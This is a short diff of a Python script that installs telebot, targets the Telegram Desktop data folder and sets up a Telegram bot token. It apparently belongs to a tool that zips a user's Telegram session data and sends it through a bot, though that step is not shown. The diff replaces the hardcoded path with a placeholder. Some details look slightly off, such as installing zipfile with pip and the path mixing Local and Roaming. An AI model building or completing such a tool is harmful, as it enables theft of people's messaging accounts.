@@ -7,7 +7,7 @@ def depencies_download():
     os.system(f"pip install telebot")
     os.system(f"pip install zipfile")
 
-user = os.path.expanduser("C:\\Appdata\\Local\\Roaming\\Telegram Desktop")
+user = os.path.expanduser("#Telegram Desktop Folder")
 home = os.path.expanduser('./')
 API_TOKEN = '#Your_telegram_bot_api_token'
 bot = telebot.TeleBot(API_TOKEN)
